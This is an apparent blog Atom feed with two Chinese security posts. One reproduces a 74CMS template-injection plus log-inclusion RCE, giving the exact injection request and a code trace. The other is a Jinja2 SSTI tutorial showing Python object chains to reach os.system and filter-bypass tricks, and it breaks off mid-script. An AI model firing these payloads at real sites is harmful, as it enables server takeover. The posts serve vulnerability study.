<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>ca01h&#39;s Blog</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://ca0y1h.top/"/>
  <updated>2020-12-19T13:24:50.194Z</updated>
  <id>http://ca0y1h.top/</id>
  
  <author>
    <name>ca01h</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>骑士CMS模板注入+文件包含getshell复现</title>
    <link href="http://ca0y1h.top/code_audit/9.%E9%AA%91%E5%A3%ABCMS%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell%E5%A4%8D%E7%8E%B0/"/>
    <id>http://ca0y1h.top/code_audit/9.%E9%AA%91%E5%A3%ABCMS%E6%A8%A1%E6%9D%BF%E6%B3%A8%E5%85%A5+%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%ABgetshell%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-12-19T13:23:50.000Z</published>
    <updated>2020-12-19T13:24:50.194Z</updated>
    
    <content type="html"><![CDATA[<h1 id="骑士CMS模板注入-日志包含RCE复现">骑士CMS模板注入+日志包含RCE复现</h1><p>本文参考自TimeLine Sec团队成员microworld的复现记录。</p><h2 id="0x01-漏洞概述">0x01 漏洞概述</h2><p><a href="http://www.74cms.com/news/show-2497.html">http://www.74cms.com/news/show-2497.html</a></p><p>骑士 CMS 官方发布安全更新，修复了一处远程代码执行漏洞。由于骑士 CMS 某些函数存在过滤不严格，攻击者通过构造恶意请求，配合文件包含漏洞可在无需登录的情况下执行任意代码，控制服务器。</p><h2 id="0x02-影响版本">0x02 影响版本</h2><p>骑士 CMS &lt; 6.0.48</p><h2 id="0x03-环境搭建">0x03 环境搭建</h2><p>从官网下载6.0.20版本源代码</p><p><a href="http://www.74cms.com/download/index.html">http://www.74cms.com/download/index.html</a></p><p>新建数据库，用MAMP Pro搭建站点</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201214210511.png" alt=""></p><h2 id="0x04-漏洞复现">0x04 漏洞复现</h2><p>发送如下请求：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[IP]&#x2F;index.php?m&#x3D;home&amp;a&#x3D;assign_resume_tpl</span><br><span class="line">POST:</span><br><span class="line">variable&#x3D;</span><br><span class="line">1</span><br><span class="line">&amp;tpl&#x3D;&lt;?php phpinfo(); ob_flush();?&gt;&#x2F;r&#x2F;n&lt;qscms&#x2F;company_show 列表名&#x3D;&quot;info&quot; 企业id&#x3D;&quot;$_GET[&#39;id&#39;]&quot;&#x2F;&gt;</span><br></pre></td></tr></table></figure><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215153839.png" alt=""></p><ol start="2"><li>查看站点日志，文件位于<code>/data/Runtime/Logs/home/20_12_15.log</code></li></ol><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215154016.png" alt=""></p><ol start="3"><li>包含日志</li></ol><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215154208.png" alt=""></p><h2 id="0x05-漏洞分析">0x05 漏洞分析</h2><p>在正式分析漏洞之前，先看一看74CMS的路由和日志记录。</p><p>由于74CMS是基于ThinkPHP 3.2.3，其标准的URL路径为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;[IP]&#x2F;index.php&#x2F;模块&#x2F;控制器&#x2F;操作</span><br></pre></td></tr></table></figure><p>但是74CMS采用的是普通模式，使用传统的GET传参来指定当前访问的模块、控制器和方法，例如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;?m&#x3D;模块&amp;c&#x3D;控制器&amp;a&#x3D;方法&amp;var&#x3D;参数</span><br></pre></td></tr></table></figure><p>当然这些参数也是可以自定义的，配置文件位于<code>ThinkPHP/Conf/convention.php</code></p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215154751.png" alt=""></p><p>其次，ThinkPHP定义了日志记录的方式，在<code>ThinkPHP/Library/Think/Log.class.php</code>中的write方法：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215155115.png" alt=""></p><p>ERR代表一般性错误，<code>$destination</code>是日志的存储位置，日志文件名是有<code>年_月_日</code>组成。</p><p>根据官方通告，漏洞代码位于<code>Application/Common/Controller/BaseController.class.php</code>的<code>assign_resume_tpl</code>方法，用于渲染简历模板：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215160033.png" alt=""></p><p>继续跟进fetch函数，该函数位于<code>Controllor.class.php</code>文件中：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215160208.png" alt=""></p><p>函数内部又调用了<code>ThinkPHP/Lirary/Think/View.class.php</code>类中的<code>fetch</code>方法：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215160728.png" alt=""></p><p><code>content</code>为空进入第一个if判断，模板文件不存在的话直接返回，下一个if语句判断<code>TMPL_ENGINE_TYPE</code>是否是<code>php</code>，我们可以全局搜索这个常量，在<code>ThinkPHP/Conf/convention.php</code>中定义为<code>Think</code>，也就是说使用Think模板，那么就进入到else语句中。</p><p>首先构造一个参数数组<code>$params</code>，然后将调用静态方法<code>Hook::listen</code>，继续跟进，位于<code>ThinkPHP/Library/Hook.class.php</code>文件中：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215161649.png" alt=""></p><p>此时<code>tag=view_parse</code>，该方法会查找<code>$tags</code>中有没有绑定<code>view_parse</code>事件的方法，然后用foreach遍历<code>$tags</code>属性，并执行<code>Hook:exec</code>方法。</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215172131.png" alt=""></p><p>此方法会检查行为名称中是否存在<code>Behavior</code>，若存在此关键字，行为扩展必须使用run入口方法，关于Hook的配置在<code>/ThinkPHP/Mode/common.php</code>中</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215184343.png" alt=""></p><p>继续跟进到<code>ThinkPHP/Behavior/ParseTemplateBehavior.class.php</code>，找到文件中的run方法：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215184717.png" alt=""></p><p>已知74CMS采用的是Think模板引擎，当首次运行时不存在缓存文件，会进入到else语句中，新建一个Template类，在调用类中的fetch方法，位于<code>ThinkPHP/Library/Think/Template.class.php</code>文件：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215185208.png" alt=""></p><p>调用<code>loadTemplate()</code>，将其存入<code>templateCacheFile</code>中，我们跟入<code>loadTemplate</code>：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215185930.png" alt=""></p><p>首先读取templateFile的文件内容存到tmplContent中，然后再调用compiler函数编译模板内容，继续跟进：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215190136.png" alt=""></p><p>传入的模板内容未经过过滤就直接被拼接到<code>$tmplContent</code>变量，然后返回<code>loadTemplate</code>方法，调用<code>put</code>方法写入缓存文件，并返回缓存文件名，于是我们再回归到<code>fetch()</code>方法，调用了<code>Storage::load</code>，位于<code>ThinkPHP/Library/Think/Storage/Driver/File.class.php</code>：</p><p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20201215191004.png" alt=""></p><p>这里就直接包含文件，最终造成了模板注入。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;骑士CMS模板注入-日志包含RCE复现&quot;&gt;骑士CMS模板注入+日志包含RCE复现&lt;/h1&gt;
&lt;p&gt;本文参考自TimeLine Sec团队成员microworld的复现记录。&lt;/p&gt;
&lt;h2 id=&quot;0x01-漏洞概述&quot;&gt;0x01 漏洞概述&lt;/h2&gt;
&lt;p&gt;&lt;a h
      
    
    </summary>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
      <category term="PHP" scheme="http://ca0y1h.top/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/PHP/"/>
    
    
      <category term="代码审计" scheme="http://ca0y1h.top/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>jinja_SSTI_Bypass</title>
    <link href="http://ca0y1h.top/Web_security/basic_learning/28.Jinja2%E7%9A%84SSTI+Bypass/"/>
    <id>http://ca0y1h.top/Web_security/basic_learning/28.Jinja2%E7%9A%84SSTI+Bypass/</id>
    <published>2020-12-19T13:23:14.000Z</published>
    <updated>2020-12-19T13:51:50.600Z</updated>
    
    <content type="html"><![CDATA[<h1 id="jinja2-SSTI-Bypass">jinja2 SSTI &amp; Bypass</h1><p>本文主要针对jinja2的SSTI做一些讲解和说明。</p><h2 id="常用的内建属性">常用的内建属性</h2><h3 id="class"><code>__class__</code></h3><p>用于返回对象所属的类，和<code>type()</code>相同：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ().<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">list</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h3 id="base"><code>__base__</code></h3><p>以字符串的形式返回一个类所继承的类，一般情况下是object</p><h3 id="bases"><code>__bases__</code></h3><p>以元组的形式返回一个类所继承的类</p><h3 id="mro"><code>__mro__</code></h3><p>返回解析方法调用的顺序，按照子类到父类到父父类的顺序返回所有类</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Father</span>():</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">GrandFather</span>():</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">son</span>(<span class="params">Father,GrandFather</span>):</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(son.__base__)</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">__main__</span>.<span class="title">Father</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span>(<span class="params">son.__bases__</span>)</span></span><br><span class="line"><span class="class">(<span class="params">&lt;class <span class="string">&#x27;__main__.Father&#x27;</span>&gt;, &lt;class <span class="string">&#x27;__main__.GrandFather&#x27;</span>&gt;</span>)</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">print</span>(<span class="params">son.__mro__</span>)</span></span><br><span class="line"><span class="class">(<span class="params">&lt;class <span class="string">&#x27;__main__.son&#x27;</span>&gt;, &lt;class <span class="string">&#x27;__main__.Father&#x27;</span>&gt;, &lt;class <span class="string">&#x27;__main__.GrandFather&#x27;</span>&gt;, &lt;class <span class="string">&#x27;object&#x27;</span>&gt;</span>)</span></span><br></pre></td></tr></table></figure><h3 id="subclasses"><code>__subclasses__()</code></h3><p>得到object类后，就可以用<code>__subclasses__()</code>获取所有的子类：</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__base__.__subclasses__()</span><br><span class="line">[&lt;class &#x27;type&#x27;&gt;, &lt;class &#x27;weakref&#x27;&gt;, &lt;class &#x27;weakcallableproxy&#x27;&gt;, &lt;class &#x27;weakproxy&#x27;&gt;, &lt;class &#x27;int&#x27;&gt;, &lt;class &#x27;bytearray&#x27;&gt;, &lt;class &#x27;bytes&#x27;&gt;, &lt;class &#x27;list&#x27;&gt;, &lt;class &#x27;NoneType&#x27;&gt;, &lt;class &#x27;NotImplementedType&#x27;&gt;, &lt;class &#x27;traceback&#x27;&gt;, &lt;class &#x27;super&#x27;&gt;, &lt;class &#x27;range&#x27;&gt;, &lt;class &#x27;dict&#x27;&gt;, &lt;class &#x27;dict_keys&#x27;&gt;, &lt;class &#x27;dict_values&#x27;&gt;, &lt;class &#x27;dict_items&#x27;&gt;, &lt;class &#x27;odict_iterator&#x27;&gt;, &lt;class &#x27;set&#x27;&gt;, &lt;class &#x27;str&#x27;&gt;, &lt;class &#x27;slice&#x27;&gt;, &lt;class &#x27;staticmethod&#x27;&gt;, &lt;class &#x27;complex&#x27;&gt;, &lt;class &#x27;float&#x27;&gt;, &lt;class &#x27;frozenset&#x27;&gt;, &lt;class &#x27;property&#x27;&gt;, &lt;class &#x27;managedbuffer&#x27;&gt;, &lt;class &#x27;memoryview&#x27;&gt;, &lt;class &#x27;tuple&#x27;&gt;, &lt;class &#x27;enumerate&#x27;&gt;......</span><br></pre></td></tr></table></figure><h3 id="dict"><code>__dict__</code></h3><p>我们在获得到一个模块时想调用模块中的方法，恰好该方法被过滤了，就可以用该方法bypass</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> os</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.system(<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="number">1</span>  <span class="number">2</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>os.__dict__[<span class="string">&#x27;s&#x27;</span>+<span class="string">&#x27;ystem&#x27;</span>](<span class="string">&#x27;ls&#x27;</span>)</span><br><span class="line"><span class="number">1</span>  <span class="number">2</span></span><br></pre></td></tr></table></figure><p>与dir()作用相同，都是返回属性、方法等；但一些数据类型是没有<code>__dict__</code>属性的，如<code>[].__dict__</code>会返回错误</p><p><code>__dict__</code>只会显示属于自己的属性，dir()除了显示自己的属性，还显示从父类继承来的属性</p><p>可以使用<code>__dict__</code>来间接调用一些属性或方法，如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>a = []</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>[].__class__.__dict__[<span class="string">&#x27;append&#x27;</span>](a, <span class="string">&#x27;ling&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>a</span><br><span class="line">[<span class="string">&#x27;ling&#x27;</span>]</span><br></pre></td></tr></table></figure><h3 id="init"><code>__init__</code></h3><p><code>__init__</code>用于初始化类，作用就是为了得到function/method模型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Base</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, a, b</span>):</span></span><br><span class="line"><span class="meta">... </span>            self.a = a</span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">func</span>():</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Child</span>(<span class="params">Base</span>):</span></span><br><span class="line"><span class="meta">... </span>    <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Child</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">__main__</span>.<span class="title">Child</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">Child</span>.<span class="title">__init__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">function</span> <span class="title">Base</span>.<span class="title">__init__</span> <span class="title">at</span> 0<span class="title">x10cc23e50</span>&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; <span class="title">Child</span>.<span class="title">func</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">function</span> <span class="title">Base</span>.<span class="title">func</span> <span class="title">at</span> 0<span class="title">x10cc23ee0</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="globals"><code>__globals__</code></h3><p>会以字典类型返回当前位置的全部模块，方法和全局变量，用于配合<code>__init__</code>使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">Student</span>:</span></span><br><span class="line"><span class="meta">... </span>    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line"><span class="meta">... </span>            <span class="keyword">pass</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu = Student()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu.__init__</span><br><span class="line">&lt;bound method Student.__init__ of &lt;__main__.Student object at <span class="number">0x10cc71880</span>&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu.__init__.__globals__</span><br><span class="line">&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;Base&#x27;: &lt;class &#x27;__main__.Base&#x27;&gt;, &#x27;Child&#x27;: &lt;class &#x27;__main__.Child&#x27;&gt;, &#x27;Student&#x27;: &lt;class &#x27;__main__.Student&#x27;&gt;, &#x27;stu&#x27;: &lt;__main__.Student object at 0x10cc71880&gt;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Student.__init__.__globals__</span><br><span class="line">&#123;&#x27;__name__&#x27;: &#x27;__main__&#x27;, &#x27;__doc__&#x27;: None, &#x27;__package__&#x27;: None, &#x27;__loader__&#x27;: &lt;class &#x27;_frozen_importlib.BuiltinImporter&#x27;&gt;, &#x27;__spec__&#x27;: None, &#x27;__annotations__&#x27;: &#123;&#125;, &#x27;__builtins__&#x27;: &lt;module &#x27;builtins&#x27; (built-in)&gt;, &#x27;Base&#x27;: &lt;class &#x27;__main__.Base&#x27;&gt;, &#x27;Child&#x27;: &lt;class &#x27;__main__.Child&#x27;&gt;, &#x27;Student&#x27;: &lt;class &#x27;__main__.Student&#x27;&gt;, &#x27;stu&#x27;: &lt;__main__.Student object at 0x10cc71880&gt;&#125;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Student.__init__</span><br><span class="line">&lt;function Student.__init__ at <span class="number">0x10cc23f70</span>&gt;</span><br></pre></td></tr></table></figure><p>果该关键字被过滤了我们可以使用<code>__getattribute__</code>，以下两者等效</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">__init__.__globals__[&#39;sys&#39;]</span><br><span class="line">__init__.__getattribute__(&#39;__global&#39;+&#39;s__&#39;)[&#39;sys&#39;]</span><br></pre></td></tr></table></figure><h2 id="builtins、-builtin-、-builtins-的区别"><code>builtins</code>、<code>__builtin__</code>、<code>__builtins__</code>的区别</h2><p>在 Python 中，有很多函数不需要任何 import 就可以直接使用，例如<code>chr</code>、<code>open</code>。之所以可以这样，是因为 Python 有个叫<code>内建模块</code>（或者叫内建命名空间）的东西，它有一些常用函数，变量和类。</p><p>在 2.x 版本中，内建模块被命名为 <code>__builtin__</code>，到了 3.x 就成了 <code>builtins</code>。它们都需要 import 才能查看：</p><p>python2</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> __builtin__</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtin__</span><br><span class="line">&lt;module <span class="string">&#x27;__builtin__&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure><p>python3</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> builtins</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>builtins</span><br><span class="line">&lt;module <span class="string">&#x27;builtins&#x27;</span> (built-<span class="keyword">in</span>)&gt;</span><br></pre></td></tr></table></figure><p>而<code>__builtins__</code> 两者都有，实际上是<code>__builtin__</code>和<code>builtins</code> 的引用。它不需要导入。不过<code>__builtins__</code>与<code>__builtin__</code>和<code>builtins</code>是有一点区别的，<code>__builtins__</code> 相对实用一点，并且在 <code>__builtins__</code>里有很多好东西：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;__import__&#x27;</span> <span class="keyword">in</span> dir(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>__builtins__.__dict__[<span class="string">&#x27;__import__&#x27;</span>](<span class="string">&#x27;os&#x27;</span>).system(<span class="string">&#x27;whoami&#x27;</span>)</span><br><span class="line">macr0phag3</span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> dir(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;execfile&#x27;</span> <span class="keyword">in</span> dir(__builtins__)</span><br><span class="line"><span class="literal">True</span></span><br></pre></td></tr></table></figure><h2 id="构造链的思路">构造链的思路</h2><h3 id="第一步">第一步</h3><p>使用<code>__class__</code>来获取内置类所对应的类，可以使用<code>str</code>，<code>dict</code>，<code>tuple</code>，<code>list</code>等来获取。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; [].<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">list</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; ().<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">tuple</span>&#x27;&gt;</span></span><br><span class="line">&gt;&gt;&gt; &#123;&#125;.__class__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">dict</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &quot;&quot;.<span class="title">__class__</span></span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">str</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h3 id="第二步">第二步</h3><p>拿到<code>object</code>基类</p><p>用<code>__bases__[0]</code>拿到基类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>用<code>__base__</code>拿到基类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><p>用<code>__mro__[1]</code>或<code>__mro__[-1]</code>拿到基类：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__[<span class="number">1</span>]</span><br><span class="line">&lt;<span class="class"><span class="keyword">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br><span class="line"><span class="class">&gt;&gt;&gt; &#x27;&#x27;.<span class="title">__class__</span>.<span class="title">__mro__</span>[-1]</span></span><br><span class="line"><span class="class">&lt;<span class="title">class</span> &#x27;<span class="title">object</span>&#x27;&gt;</span></span><br></pre></td></tr></table></figure><h3 id="第三步">第三步</h3><p>用<code>__subclasses__()</code>拿到子类列表：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line">...一大堆的子类</span><br></pre></td></tr></table></figure><h3 id="第四步">第四步</h3><p>在子类列表中寻找中寻找可以getshell的类</p><h2 id="寻找利用链">寻找利用链</h2><p>我们一般来说是先知晓一些可以getshell的类，然后再去跑这些类的索引，然后这里先讲述如何去跑索引，再详写可以getshell的类</p><p>这里先给出一个在本地遍历的脚本，原理是先遍历所有子类，然后再遍历子类的方法的所引用的东西，来搜索是否调用了我们所需要的方法，这里以<code>popen</code>为例子。</p><p>local_find.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">search = <span class="string">&#x27;popen&#x27;</span></span><br><span class="line">num  = <span class="number">-1</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> ().__class__.__base__[<span 